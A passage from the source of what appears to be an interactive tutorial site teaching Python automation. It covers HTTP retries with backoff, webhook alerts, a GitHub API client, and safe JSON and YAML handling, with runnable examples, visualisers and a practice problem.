        for k, v in (headers or {}).items():
            self.send_header(k, v)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        if self.path == "/api/servers":
            self._send(200, {"servers": [{"name": "web-01", "state": "up"}, {"name": "db-01", "state": "down"}]})
        elif self.path == "/api/flaky":             # fails twice, then works
            calls["flaky"] += 1
            if calls["flaky"] <= 2:
                self._send(503, {"error": "busy"}, {"Retry-After": "0"})
            else:
                self._send(200, {"ok": True, "attempt": calls["flaky"]})
        else:
            self._send(404, {"error": "not found"})

    def do_POST(self):                              # pretend to be a Slack-style webhook
        length = int(self.headers.get("Content-Length", 0))
        msg = json.loads(self.rfile.read(length))
        print("  [webhook received]", msg["text"])
        self._send(200, {"ok": True})

    def log_message(self, *args):                   # keep the demo output quiet
        pass


RETRYABLE = {429, 500, 502, 503, 504}


def get_json(url, attempts=4, base=0.05, cap=1.0, timeout=5):
    """GET a URL and return parsed JSON. Retries 429/5xx and network errors with full-jitter backoff."""
    for attempt in range(attempts):
        try:
            with urllib.request.urlopen(url, timeout=timeout) as resp:
                return json.load(resp)
        except urllib.error.HTTPError as e:         # the server answered with 4xx/5xx
            if e.code not in RETRYABLE or attempt == attempts - 1:
                raise
            reason = f"HTTP {e.code}"
        except (urllib.error.URLError, TimeoutError) as e:   # no answer at all
            if attempt == attempts - 1:
                raise
            reason = f"network: {e}"
        delay = random.uniform(0, min(cap, base * 2 ** attempt))
        print(f"  attempt {attempt + 1} failed ({reason}), retrying in {delay:.2f}s")
        time.sleep(delay)


def send_alert(text):
    """POST a message to the webhook in ALERT_WEBHOOK_URL. The URL is a secret: never put it in code."""
    url = os.environ["ALERT_WEBHOOK_URL"]
    req = urllib.request.Request(url, data=json.dumps({"text": text}).encode(),
                                 headers={"Content-Type": "application/json"}, method="POST")
    with urllib.request.urlopen(req, timeout=5) as resp:
        return resp.status


server = ThreadingHTTPServer(("127.0.0.1", 0), FakeAPI)    # port 0 = any free port
threading.Thread(target=server.serve_forever, daemon=True).start()
base_url = f"http://127.0.0.1:{server.server_port}"
random.seed(7)

servers = get_json(base_url + "/api/servers")["servers"]
down = [s["name"] for s in servers if s["state"] != "up"]
print("down:", down)

print("flaky:", get_json(base_url + "/api/flaky"))

try:
    get_json(base_url + "/api/nope")
except urllib.error.HTTPError as e:
    print("not retried, failed at once with", e.code)

# Demo only: in real life the webhook URL is injected by cron, CI or a secrets manager.
os.environ.setdefault("ALERT_WEBHOOK_URL", base_url + "/webhook")
if down:
    print("alert status:", send_alert(f":red_circle: {len(down)} server(s) down: {', '.join(down)}"))
server.shutdown()
# Output (retry delays vary a little):
# down: ['db-01']
#   attempt 1 failed (HTTP 503), retrying in 0.02s
#   attempt 2 failed (HTTP 503), retrying in 0.02s
# flaky: {'ok': True, 'attempt': 3}
# not retried, failed at once with 404
#   [webhook received] :red_circle: 1 server(s) down: db-01
# alert status: 200` }, R`"""The same ideas with requests: one Session, retries in the adapter, timeouts on every call.
pip install requests   (needs a GITHUB_TOKEN in the environment to run)
"""
import os

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry


def github_session():
    s = requests.Session()                                   # reuses TCP/TLS connections
    s.headers.update({
        "Authorization": f"Bearer {os.environ['GITHUB_TOKEN']}",   # KeyError if missing: good
        "Accept": "application/vnd.github+json",
        "X-GitHub-Api-Version": "2022-11-28",
    })
    retry = Retry(total=5, backoff_factor=0.5,                # 0.5, 1, 2, 4 s ... between tries
                  status_forcelist=[429, 500, 502, 503, 504],
                  allowed_methods=frozenset(["GET", "PUT", "DELETE"]),   # never blindly retry POST
                  respect_retry_after_header=True)
    s.mount("https://", HTTPAdapter(max_retries=retry))
    return s


def list_repos(org):
    s = github_session()
    url = f"https://api.github.com/orgs/{org}/repos?per_page=100"
    repos = []
    while url:                                               # GitHub paginates with a Link header
        r = s.get(url, timeout=(3.05, 27))                   # (connect, read) seconds
        r.raise_for_status()                                 # 4xx/5xx -> requests.HTTPError
        repos.extend(repo["full_name"] for repo in r.json())
        url = r.links.get("next", {}).get("url")             # None on the last page
    return repos


if __name__ == "__main__":
    for name in list_repos(os.environ.get("GITHUB_ORG", "octo-org")):
        print(name)`],
    codeTitle: ['Runnable: a local fake API, a retrying client and a webhook alert', 'Production version with requests: Session, Retry adapter, timeouts, Link pagination'],
    viz: [{
      title: 'Retry timeline: backoff, give-up rules and the total wait',
      input: '503,503,429,200',
      inputLabel: 'HTTP status of each attempt (0 = timeout), max 8',
      gen: function (input) {
        var st = csv(input).map(Number);
        if (!st.length || st.length > 8 || st.some(function (x) { return isNaN(x) || x < 0 || x > 599; })) throw new Error('Give 1-8 status codes like 503,503,200 (0 = timeout)');
        var RETRY = [0, 429, 500, 502, 503, 504], MAX = 5, base = 1, cap = 8;
        var f = [], waits = [], labels = [], slept = 0, done = false;
        f.push({ narr: 'Our policy: at most <b>' + MAX + '</b> attempts, wait <code>min(' + cap + ', ' + base + ' × 2<sup>n</sup>)</code> seconds before retry n (jitter left out so the numbers are easy to follow). Retry only on timeouts, 429 and 5xx.', parts: [
          { type: 'array', label: 'responses the server will give', values: st.map(function (x) { return x === 0 ? 'timeout' : x; }) },
          { type: 'set', label: 'retryable', items: ['timeout', '429', '500', '502', '503', '504'] }
        ] });
        for (var i = 0; i < st.length && !done; i++) {
          var s = st[i], name = s === 0 ? 'timeout' : String(s), hl = {};
          for (var j = 0; j < i; j++) hl[j] = 'done';
          var ok = s >= 200 && s < 300, retry = RETRY.indexOf(s) >= 0;
          hl[i] = ok ? 'ok' : (retry ? 'cur' : 'bad');
          var narr, last = i === MAX - 1;
          if (ok) { narr = 'Attempt ' + (i + 1) + ': <b>' + name + '</b>. Success, return the data. Total time spent waiting: <b>' + slept + ' s</b>.'; done = true; }
          else if (!retry) { narr = 'Attempt ' + (i + 1) + ': <b>' + name + '</b>. This is a client-side error: sending the same request again gives the same answer. ' + H.c('r', 'Stop now and raise.'); done = true; }
          else if (last) { narr = 'Attempt ' + (i + 1) + ': <b>' + name + '</b>. That was the last allowed attempt. ' + H.c('r', 'Give up and raise') + ', so cron or CI shows the failure instead of retrying forever.'; done = true; }
          else {
            var d = Math.min(cap, base * Math.pow(2, i));
            waits.push(d); labels.push('before #' + (i + 2)); slept += d;
            narr = 'Attempt ' + (i + 1) + ': <b>' + name + '</b>. Retryable, so sleep <b>' + d + ' s</b> (double the last wait' + (d === cap ? ', but capped at ' + cap : '') + ') and try again.' + (s === 429 ? ' A real client would use the <code>Retry-After</code> header if the server sent one.' : '');
          }
          f.push({ narr: narr, parts: [
            { type: 'array', label: 'attempts', values: st.map(function (x) { return x === 0 ? 'timeout' : x; }), hl: hl },
            { type: 'bars', label: 'waits so far (seconds)', values: waits.length ? waits.slice() : [0], idxLabels: waits.length ? labels.slice() : ['none'] },
            { type: 'vars', label: 'state', vals: { attempt: String(i + 1) + ' of ' + MAX, 'total waited': slept + ' s' } }
          ] });
        }
        if (!done) f.push({ narr: 'The list ended before a final answer. In real life the next attempt would happen after the wait shown. Add a 200 at the end to see success.', parts: f[f.length - 1].parts });
        f.push({ narr: 'With <b>jitter</b>, each wait would be a random number between 0 and the value shown. That spreads out a crowd of clients that all failed at the same moment, so they do not hit the server together again.', parts: [
          { type: 'table', label: 'full jitter, same caps', columns: ['retry', 'no jitter', 'full jitter range'], rows: [1, 2, 3, 4].map(function (n) { var d = Math.min(cap, base * Math.pow(2, n - 1)); return [String(n), d + ' s', '0 - ' + d + ' s']; }) }
        ] });
        return pad4(f, 'Try 500,500,500,500,500,500 to see the give-up rule, or 404 to see an instant stop.');
      }
    }],
    examples: [
      { title: 'A Slack alert when a nightly job fails', html: `<p>A Slack incoming webhook takes a POST with a JSON body like <code>{"text": "..."}</code>. Microsoft Teams now uses <b>Workflows</b> webhooks (the old Office 365 connectors are being retired); they take a similar POST with an Adaptive Card body. Either way the URL is a secret, so it comes from the environment (set by cron's environment file, a systemd <code>EnvironmentFile</code> readable only by the service user, or fetched from a secrets manager). The alert must never crash the job that is reporting: log and move on if the webhook itself fails.</p>`, code: R`import json
import logging
import os
import urllib.request

log = logging.getLogger("alerts")


def alert(text: str) -> bool:
    """Best effort: returns False instead of raising, so a broken webhook never hides the real failure."""
    url = os.environ.get("SLACK_WEBHOOK_URL")
    if not url:
        log.warning("SLACK_WEBHOOK_URL not set; alert not sent: %s", text)
        return False
    body = json.dumps({"text": text}).encode()
    req = urllib.request.Request(url, data=body, method="POST",
                                 headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            return 200 <= resp.status < 300
    except OSError as e:                       # URLError, HTTPError and timeouts are all OSError
        log.error("alert failed: %s", e)        # never log the URL itself: it is the secret
        return False


# usage at the end of a job:
#   if failures:
#       alert(f"nightly-backup: {len(failures)} database(s) failed on {os.uname().nodename}")` },
      { title: 'Backoff numbers you can reason about', html: `<p>Interviewers like to ask "how long can this retry loop take?". With base 1 s, cap 30 s and 6 attempts, the waits are 1, 2, 4, 8, 16 = <b>31 s</b> worst case before the final try (plus each call's own timeout). Full jitter makes the <i>expected</i> wait about half that. Fixing the random seed makes the jittered values reproducible, which is handy in tests.</p>`, code: { lang: 'python', run: true, code: R`import random


def backoff(attempt, base=1.0, cap=30.0):
    """Upper bound for the wait before retry number attempt+1."""
    return min(cap, base * 2 ** attempt)


plain = [backoff(a) for a in range(5)]
print("no jitter:", plain, "total", sum(plain), "s")

rng = random.Random(42)                          # seeded: same numbers every run
jittered = [round(rng.uniform(0, backoff(a)), 2) for a in range(5)]
print("full jitter:", jittered, "total", round(sum(jittered), 2), "s")
print("cap kicks in:", [backoff(a) for a in range(4, 8)])
# Output:
# no jitter: [1.0, 2.0, 4.0, 8.0, 16.0] total 31.0 s
# full jitter: [0.64, 0.05, 1.1, 1.79, 11.78] total 15.36 s
# cap kicks in: [16.0, 30.0, 30.0, 30.0]` } },
      { title: 'Retrying a POST created two incidents', html: `<p>A monitoring script opened an incident with <code>POST /incidents</code> and retried on timeout. The first request had actually worked; only the reply was slow. The retry created a second incident and paged two people. Fixes, best first: send an <b>idempotency key</b> (a unique id per logical action, for example <code>Idempotency-Key: nightly-backup-2026-10-19</code>) if the API supports it; otherwise <b>look before you create</b> (search for an open incident with the same title); and limit urllib3's <code>Retry</code> to idempotent methods, which is its default for <code>allowed_methods</code>.</p>
        ${H.table(['Method', 'Safe to retry blindly?', 'Why'], [['GET, HEAD', H.c('g', 'yes'), 'reads only'], ['PUT, DELETE', H.c('g', 'yes'), 'same final state if repeated'], ['POST', H.c('r', 'no'), 'may create a duplicate'], ['PATCH', H.c('y', 'depends'), '"set x=5" is safe, "add 1 to x" is not']])}` }
    ],
    deepDive: `<p>🟣 <b>Timeouts are two numbers.</b> The <b>connect</b> timeout covers DNS plus the TCP and TLS handshake; the <b>read</b> timeout is the longest gap between bytes, <b>not</b> the total time. A server that sends one byte every 20 s never trips a 27 s read timeout. If you need a hard deadline for the whole call, track it yourself (<code>time.monotonic()</code>) or run the call in a worker with a deadline. In urllib, the single <code>timeout</code> applies to each blocking socket operation.</p>
      <p><b>Retry budgets and storms.</b> Retries multiply load: if 3 layers each retry 3 times, one failing request becomes 27. Retry at <b>one</b> layer, cap total attempts and total time, and add jitter. AWS SDKs, urllib3 and most cloud SDKs already retry, so do not wrap them in a second loop without thinking. For 429, honour <code>Retry-After</code> (seconds or an HTTP date) and treat it as a minimum.</p>
      <p><b>Sessions and connection reuse.</b> <code>requests.Session</code> keeps connections open (keep-alive), so 1,000 calls to the same host skip 999 TLS handshakes; it also holds shared headers and the retry adapter. Create one per thread if you use many threads, or a single one shared carefully (requests' Session is widely used across threads but is not officially documented as thread-safe).</p>
      <p><b>TLS and proxies.</b> Never set <code>verify=False</code> to "fix" a certificate error: point <code>REQUESTS_CA_BUNDLE</code> or <code>verify=</code> at your company CA bundle instead. Both libraries honour <code>HTTPS_PROXY</code> and <code>NO_PROXY</code>, which matters in locked-down VPCs.</p>
      <p><b>Logging without leaking.</b> Never log full request headers (they contain the token) or webhook URLs. If you enable <code>http.client</code> debug logging while troubleshooting, turn it off before the script goes to production.</p>`,
    aiEra: `<p>🤖 <b>What AI changes:</b> assistants know the shapes of the popular APIs (GitHub, Slack, PagerDuty, Jira) and write a working client in one go, including pagination and auth headers. They are also good at turning an OpenAPI spec into a typed client, or a <code>curl</code> example from docs into Python.</p>
      <p><b>Where it goes wrong:</b> generated clients usually have <b>no timeout</b>, retry every error including 400 and 401, retry POSTs, and sometimes paste the token right into the code "for testing". Some suggest <code>verify=False</code> for certificate errors. And an assistant may invent an endpoint or a field that does not exist. <b>Your job:</b> check every call against the real API docs, add timeouts, a retry policy limited to 429/5xx and idempotent methods, <code>raise_for_status()</code>, and read secrets from the environment. When you test, use a local fake server like the one above, not production.</p>`,
    problems: [P({
      t: 'Decide the outcome of a retry policy', l: 'Easy', tags: ['retries', 'backoff', 'http status', 'pure function'], co: ['Stripe', 'Amazon', 'Razorpay'], c: PURE,
      s: `<p>Before wiring a retry loop to a real API, the team wants its rules as a pure, tested function. Write <code>retry_outcome(statuses, max_attempts)</code>. <code>statuses[i]</code> is what attempt <i>i+1</i> returns; <code>0</code> means a timeout. The list always has enough entries to reach a final answer.</p>
        <ul><li>200-299: success, stop. Outcome <code>"ok"</code>.</li>
        <li>0, 429, 500, 502, 503, 504: retryable. If this was attempt number <code>max_attempts</code>, stop with <code>"gave up S"</code> (S = that status); otherwise sleep and try again.</li>
        <li>Anything else (301, 400, 403, 404 ...): stop at once with <code>"failed S"</code>.</li></ul>
        <p>The sleep before attempt <i>n</i> (n ≥ 2) is <code>min(8, 2<sup>n−2</sup>)</code> seconds: 1, 2, 4, 8, 8 ... Return <code>[outcome, attempts_used, total_seconds_slept]</code>, all as strings.</p>`,
      ex: `<p><code>retry_outcome([503, 503, 200], 5)</code> → ${H.c('g', '["ok", "3", "3"]')}: two failures, sleeps of 1 s and 2 s, success on attempt 3. <code>retry_outcome([429, 403], 5)</code> → ${H.c('r', '["failed 403", "2", "1"]')}: the 403 is not worth retrying.</p>`,
      bw: `<p>A loop that retries <b>every</b> non-200 answer until a counter runs out. It wastes all attempts on a 404 or 403, delays the real error by the full backoff time, and can lock out an account by retrying bad credentials. Forgetting the cap on the wait is the second classic mistake: attempt 10 would sleep 256 s.</p>`,
      bc: `def retry_outcome(statuses, max_attempts):
    slept = 0
    for i, s in enumerate(statuses[:max_attempts]):
        if s == 200:
            return ["ok", str(i + 1), str(slept)]
        slept += 2 ** i                   # no cap, and retries 404 and 403 too
    return ["gave up", str(max_attempts), str(slept)]`,
      q: ['A call fails with 401 Unauthorized. What should the retry loop do?', ['Stop and raise: the token is wrong or expired, so retrying cannot help', 'Retry with backoff', 'Retry immediately once', 'Sleep for Retry-After seconds'], 0, '4xx codes other than 429 describe a problem with the request itself. Retrying only adds delay and, for auth errors, can trigger lockouts or alerts.'],
      h: ['<p>Hint 1: classify each status into three buckets: success (200-299), retryable (0, 429, 500, 502, 503, 504) or fatal (everything else).</p>', '<p>Hint 2: the sleep happens <b>between</b> attempts, so add it only when you are about to try again, never after the last attempt.</p>', '<p>Hint 3: loop with <code>n</code> from 1. Success → return. Fatal → return "failed". Retryable and <code>n == max_attempts</code> → "gave up". Else add <code>min(8, 2 ** (n - 1))</code> to the total (that is the wait before attempt n+1).</p>'],
      a: `<p>Walk the attempts in order and classify each status. A 2xx ends the loop with success. A non-retryable status ends it at once with "failed", because sending the same request again cannot change the answer. A retryable status either ends the loop with "gave up" (if it was the last allowed attempt) or adds the wait for the next attempt: before attempt n+1 that is <code>min(8, 2<sup>n−1</sup>)</code>. Returning attempts and total sleep lets you assert the worst-case delay in a unit test, which is exactly the number you need when you set the job's overall timeout.</p>`,
      code: `RETRYABLE = {0, 429, 500, 502, 503, 504}


def retry_outcome(statuses, max_attempts):
    """Simulate the retry policy. Returns [outcome, attempts, seconds slept] as strings."""
    slept = 0
    for n in range(1, max_attempts + 1):
        status = statuses[n - 1]
        if 200 <= status < 300:
            return ["ok", str(n), str(slept)]
        if status not in RETRYABLE:
            return [f"failed {status}", str(n), str(slept)]
        if n == max_attempts:
            return [f"gave up {status}", str(n), str(slept)]
        slept += min(8, 2 ** (n - 1))      # wait before attempt n + 1: 1, 2, 4, 8, 8 ...
    return ["gave up", str(max_attempts), str(slept)]   # only if max_attempts < 1`,
      cx: `<p>O(max_attempts) time, O(1) extra space. In a real client the same function body wraps the HTTP call, with the sleep replaced by <code>time.sleep()</code> plus jitter.</p>`,
      f: ['How would you add a total deadline, for example "never spend more than 20 s in total"?', 'Where would <code>Retry-After</code> fit into this function?'],
      tests: { sig: 'int[] int -> string[]', fn: 'retryOutcome', cases: [
        [[[200], 5], ['ok', '1', '0']],
        [[[503, 503, 200], 5], ['ok', '3', '3']],
        [[[404], 5], ['failed 404', '1', '0']],
        [[[503, 503, 503], 3], ['gave up 503', '3', '3']],
        [[[500, 429, 0, 502, 503, 200], 6], ['ok', '6', '23']],
        [[[429, 403], 5], ['failed 403', '2', '1']],
        [[[0, 201], 2], ['ok', '2', '1']],
        [[[503, 200], 1], ['gave up 503', '1', '0']],
        [[[301], 3], ['failed 301', '1', '0']],
        [[[504, 504, 504, 504, 504, 504, 504], 7], ['gave up 504', '7', '31']]
      ] }
    })]
  });

  // ───────────────────────── Topic 3: JSON and YAML ─────────────────────────
  var INV_YAML = R`# inventory.yaml - which servers exist, grouped by role (Ansible-style layout)
all:
  vars:
    ssh_user: deploy
    log_dir: /var/log/myapp
  children:
    web:
      hosts:
        web-01.internal: {}
        web-02.internal:
          log_dir: /srv/logs        # host-level override
    db:
      hosts:
        db-01.internal:
          backup: true
    prod:
      children:                     # a group made of other groups
        web: {}
        db: {}`;
  topics.push({
    title: 'JSON and YAML: Reading Config and Inventories Safely',
    analogy: `<p>JSON is a <b>strict form</b> at the bank: every box has a fixed shape, quotes everywhere, no comments, and the clerk rejects it if one comma is wrong. YAML is a <b>friendly handwritten note</b>: easy for people to write and read, with comments, but the reader has to <i>guess</i> what some words mean. Write "NO" for Norway and an old-style reader may think you meant "false". And <code>yaml.load</code> on an untrusted file is like a note that says "and also, go and run this program": the safe reader (<code>yaml.safe_load</code>) simply refuses to obey that part.</p>`,
    explain: `<p>🟢 <b>JSON in Python is two functions each way.</b> <code>json.loads(text)</code> / <code>json.load(file)</code> turn JSON into Python objects; <code>json.dumps(obj)</code> / <code>json.dump(obj, file)</code> go back. The mapping is simple:</p>
      ${H.table(['JSON', 'Python', 'Watch out'], [
        ['object <code>{}</code>', '<code>dict</code>', 'keys are always strings in JSON'],
        ['array <code>[]</code>', '<code>list</code>', 'tuples become lists on the way out'],
        ['string', '<code>str</code>', 'non-ASCII is escaped unless <code>ensure_ascii=False</code>'],
        ['number', '<code>int</code> or <code>float</code>', '<code>datetime</code> and <code>set</code> cannot be dumped without help'],
        ['<code>true</code> / <code>false</code> / <code>null</code>', '<code>True</code> / <code>False</code> / <code>None</code>', '']
      ])}
      <p>Almost every API and cloud CLI speaks JSON (<code>aws ec2 describe-instances</code> prints it), so in automation you mostly <b>read</b> nested dicts and lists. Use <code>.get("key", default)</code> for fields that may be missing, and <code>indent=2, sort_keys=True</code> when writing files people will diff in Git.</p>
      <p>🟢 <b>YAML is what humans write:</b> Kubernetes manifests, GitHub Actions, Ansible inventories, Docker Compose, your own tool's config. Python reads it with the <b>PyYAML</b> library (<code>pip install pyyaml</code>, imported as <code>yaml</code>). The one rule to remember:</p>
      <p>${H.c('g', '<b>Always <code>yaml.safe_load()</code></b>')}, never <code>yaml.load()</code> with the full or unsafe loader. YAML has tags like <code>!!python/object/apply:os.system</code> that tell the full loader to <b>build Python objects and call functions</b> while reading. A malicious or just careless config file could then run commands on your machine as soon as you load it. <code>safe_load</code> only builds plain types: dicts, lists, strings, numbers, booleans, None and dates. In PyYAML 6, calling <code>yaml.load(text)</code> without a <code>Loader</code> is an error for exactly this reason. To write YAML, use <code>yaml.safe_dump(data, sort_keys=False)</code>.</p>
      <p>🔵 <b>Validate after loading.</b> A file can be valid YAML and still wrong: a missing key, a string where you wanted a list, a typo like <code>hots:</code>. Check the shape right after loading and fail with a clear message naming the file and the key, before any server is touched. Small tools can check by hand; bigger ones use <code>dataclasses</code> or a schema library such as pydantic or jsonschema.</p>
      <p>🔵 <b>Write files atomically.</b> If your script rewrites a JSON state file and crashes halfway, the next run finds half a file. Write to a temp file in the same folder, then <code>os.replace(tmp, path)</code>: on Linux the rename is atomic, so readers see either the old file or the new one, never a broken one.</p>`,
    clues: [
      '"parse the output of aws ... --output json" → <code>json.loads(subprocess.run(...).stdout)</code>, then plain dict access',
      '"load the YAML inventory/config" → <code>yaml.safe_load</code>, then validate the shape and fail with the file and key name',
      '"why not yaml.load?" → arbitrary Python object construction = code execution from a config file',
      '"the config said NO and Python got False" / "version 1.10 became 1.1" → YAML 1.1 implicit typing; quote the value',
      '"the state file was empty after a crash" → write to a temp file and <code>os.replace</code> (atomic rename)',
      '"Object of type datetime is not JSON serializable" → <code>default=str</code> or convert with <code>.isoformat()</code>'
    ],
    code: [{ lang: 'python', run: true, code: R`"""JSON round trip, safe defaults, validation and atomic writes - standard library only."""
import json
import os
import tempfile
from datetime import datetime, timezone
from pathlib import Path

# 1. Parse CLI-style JSON (this is the shape 'aws ec2 describe-volumes' prints, trimmed).
raw = """
{"Volumes": [
  {"VolumeId": "vol-0a1", "Size": 100, "State": "in-use",
   "Tags": [{"Key": "Owner", "Value": "team-a"}]},
  {"VolumeId": "vol-0b2", "Size": 500, "State": "available"}
]}
"""
data = json.loads(raw)
for v in data["Volumes"]:
    tags = {t["Key"]: t["Value"] for t in v.get("Tags", [])}     # AWS tag list -> dict
    print(v["VolumeId"], v["State"], "owner:", tags.get("Owner", "MISSING"))

unattached_gb = sum(v["Size"] for v in data["Volumes"] if v["State"] == "available")
print("unattached GB:", unattached_gb)

# 2. Bad JSON gives a precise position.
try:
    json.loads('{"region": "eu-west-1",}')                       # trailing comma
except json.JSONDecodeError as e:
    print(f"bad JSON at line {e.lineno} col {e.colno}: {e.msg}")


# 3. Validate the shape of a loaded config before using it.
def validate(cfg, source):
    errors = []
    if not isinstance(cfg.get("regions"), list) or not cfg["regions"]:
        errors.append("'regions' must be a non-empty list")
    if not isinstance(cfg.get("retention_days"), int) or cfg["retention_days"] < 1:
        errors.append("'retention_days' must be a positive integer")
    if errors:
        raise ValueError(f"{source}: " + "; ".join(errors))
    return cfg


try:
    validate({"regions": "eu-west-1", "retention_days": 30}, "cleanup.json")
except ValueError as e:
    print("config error ->", e)


# 4. Atomic write: temp file in the same folder, then os.replace.
def write_json_atomic(path: Path, obj) -> None:
    fd, tmp = tempfile.mkstemp(dir=path.parent, prefix=path.name, suffix=".tmp")
    try:
        with os.fdopen(fd, "w") as f:
            json.dump(obj, f, indent=2, sort_keys=True, default=str)   # default=str handles datetime
            f.flush()
            os.fsync(f.fileno())
        os.replace(tmp, path)                  # atomic on the same filesystem
    except BaseException:
        os.unlink(tmp)
        raise


with tempfile.TemporaryDirectory() as d:
    state = Path(d) / "state.json"
    write_json_atomic(state, {"last_run": datetime(2026, 10, 19, 2, 0, tzinfo=timezone.utc),
                              "deleted": ["snap-0a1"]})
    print(state.read_text())
# Output:
# vol-0a1 in-use owner: team-a
# vol-0b2 available owner: MISSING
# unattached GB: 500
# bad JSON at line 1 col 23: Illegal trailing comma before end of object
# config error -> cleanup.json: 'regions' must be a non-empty list
# {
#   "deleted": [
#     "snap-0a1"
#   ],
#   "last_run": "2026-10-19 02:00:00+00:00"
# }` }, { lang: 'yaml', code: INV_YAML }, R`"""Load the inventory with yaml.safe_load and list the hosts of a group.
pip install pyyaml   ->   python3 hosts.py inventory.yaml prod
"""
import argparse
import sys

import yaml


def load_inventory(path):
    with open(path, encoding="utf-8") as f:
        inv = yaml.safe_load(f)                 # plain dicts/lists only, never Python objects
    if not isinstance(inv, dict) or "all" not in inv:
        raise ValueError(f"{path}: top level must be a mapping with an 'all' group")
    return inv


def index_groups(inv):
    """Walk the tree once: group name -> (set of hosts, set of child group names)."""
    groups = {}

    def walk(name, body):
        body = body or {}                       # 'web:' with nothing after it loads as None
        hosts, kids = groups.setdefault(name, (set(), set()))
        hosts.update((body.get("hosts") or {}).keys())
        children = body.get("children") or {}
        kids.update(children.keys())
        for child, child_body in children.items():
            walk(child, child_body)

    for name, body in inv.items():
        walk(name, body)
    return groups


def hosts_of(groups, group):
    seen, pending, result = set(), [group], set()
    while pending:
        g = pending.pop()
        if g in seen or g not in groups:
            continue
        seen.add(g)
        hosts, kids = groups[g]
        result |= hosts
        pending.extend(kids)
    return sorted(result)


def main(argv=None):
    p = argparse.ArgumentParser()
    p.add_argument("inventory")
    p.add_argument("group")
    args = p.parse_args(argv)
    try:
        groups = index_groups(load_inventory(args.inventory))
    except (OSError, yaml.YAMLError, ValueError) as e:
        print(f"error: {e}", file=sys.stderr)
        return 2
    hosts = hosts_of(groups, args.group)
    if not hosts:
        print(f"error: group '{args.group}' is empty or unknown", file=sys.stderr)
        return 1
    print("\n".join(hosts))
    return 0


if __name__ == "__main__":
    sys.exit(main())`],
    codeTitle: ['Runnable: parse CLI JSON, validate config, write state atomically', 'inventory.yaml', 'hosts.py: safe_load, index the groups, expand a group'],
    viz: [{
      title: 'Expanding a group in a YAML inventory',
      input: 'prod',
      inputLabel: 'group to expand: all, prod, web or db',
      gen: function (input) {
        var g = String(input || '').trim();
        var G = { all: { hosts: [], kids: ['web', 'db', 'prod'] }, web: { hosts: ['web-01.internal', 'web-02.internal'], kids: [] }, db: { hosts: ['db-01.internal'], kids: [] }, prod: { hosts: [], kids: ['web', 'db'] } };
        if (!G[g]) throw new Error('Pick one of: all, prod, web, db');
        var f = [], pending = [g], seen = [], result = [];
        f.push({ narr: '<code>yaml.safe_load</code> turned the file into nested dicts. First we <b>index</b> it: for each group name, its own hosts and its child groups. <code>prod</code> has no hosts of its own; it is made of <code>web</code> and <code>db</code>.', parts: [
          { type: 'map', label: 'group -> own hosts', entries: Object.keys(G).map(function (k) { return [k, G[k].hosts.join(', ') || '(none)']; }) },
          { type: 'map', label: 'group -> child groups', entries: Object.keys(G).map(function (k) { return [k, G[k].kids.join(', ') || '(none)']; }) }
        ] });
        f.push({ narr: 'To expand <b>' + g + '</b>, put it on a to-do stack. We keep a <b>seen</b> set so a group listed twice (or a loop like a → b → a) is only expanded once.', parts: [
          { type: 'stack', label: 'to-do stack', items: pending.slice() },
          { type: 'set', label: 'hosts found', items: [] }
        ] });
        var guard = 0;
        while (pending.length && guard++ < 20) {
          var cur = pending.pop();
          if (seen.indexOf(cur) >= 0) {
            f.push({ narr: 'Pop <b>' + cur + '</b>: already expanded, skip it. This is what stops duplicates and loops.', parts: [
              { type: 'stack', label: 'to-do stack', items: pending.slice() },
              { type: 'set', label: 'seen groups', items: seen.slice(), hl: one(cur, 'bad') },
              { type: 'set', label: 'hosts found', items: result.slice().sort() }
            ] });
            continue;
          }
          seen.push(cur);
          var added = G[cur].hosts.filter(function (h) { return result.indexOf(h) < 0; });
          result = result.concat(added);
          G[cur].kids.forEach(function (k) { pending.push(k); });
          var hl = {}; added.forEach(function (h) { hl[h] = 'ok'; });
          f.push({ narr: 'Pop <b>' + cur + '</b>. Add its own hosts' + (added.length ? ' (<b>' + added.join(', ') + '</b>)' : ' (none)') + ' and push its children' + (G[cur].kids.length ? ' (' + G[cur].kids.join(', ') + ')' : ' (none)') + '.', parts: [
            { type: 'stack', label: 'to-do stack', items: pending.slice() },
            { type: 'set', label: 'seen groups', items: seen.slice(), hl: one(cur, 'cur') },
            { type: 'set', label: 'hosts found', items: result.slice().sort(), hl: hl }
          ] });
        }
        f.push({ narr: 'Stack empty. <b>' + g + '</b> means these ' + result.length + ' host(s), sorted so the output is stable and easy to diff. Host-level settings such as <code>log_dir: /srv/logs</code> on web-02 would now be merged over group <code>vars</code>.', parts: [
          { type: 'array', label: 'hosts in ' + g, values: result.slice().sort(), hl: (function () { var h = {}; result.forEach(function (_, i) { h[i] = 'sel'; }); return h; })() }
        ] });
        return pad4(f, 'Try another group name.');
      }
    }, {
      title: 'YAML 1.1 surprises: what safe_load really returns',
      input: 'NO, 0755, 22:30, 1.10, "1.10", on, eu-west-1, ~',
      inputLabel: 'comma-separated YAML scalars (up to 10)',
      gen: function (input) {
        var vals = csv(input);
        if (!vals.length || vals.length > 10) throw new Error('Give 1-10 comma-separated values');
        function res(s) {
          if (/^".*"$|^'.*'$/.test(s)) return ['str', "'" + s.slice(1, -1) + "'", 'quoted: always a string'];
          if (/^(y|Y|yes|Yes|YES|n|N|no|No|NO|true|True|TRUE|false|False|FALSE|on|On|ON|off|Off|OFF)$/.test(s)) {
            if (/^(y|Y|n|N)$/.test(s)) return ['str', "'" + s + "'", 'PyYAML keeps single y/n as text'];
            var t = /^(yes|true|on)$/i.test(s);
            return ['bool', t ? 'True' : 'False', 'YAML 1.1 boolean word'];
          }
          if (/^(~|null|Null|NULL)?$/.test(s)) return ['NoneType', 'None', 'null'];
          if (/^[-+]?0[0-7]+$/.test(s)) return ['int', String(parseInt(s, 8)), 'leading 0 = octal in YAML 1.1'];
          if (/^[-+]?[1-9][0-9_]*(:[0-5]?[0-9])+$/.test(s)) { var p = s.split(':').map(Number), n = 0; p.forEach(function (x) { n = n * 60 + x; }); return ['int', String(n), 'base-60 number (like a time)']; }
          if (/^[-+]?(0|[1-9][0-9_]*)$/.test(s)) return ['int', String(Number(s.replace(/_/g, ''))), 'plain integer'];
          if (/^[-+]?([0-9][0-9_]*)?\.[0-9]*([eE][-+][0-9]+)?$/.test(s)) return ['float', String(parseFloat(s)), 'float: trailing zeros are lost'];
          return ['str', "'" + s + "'", 'plain text'];
        }
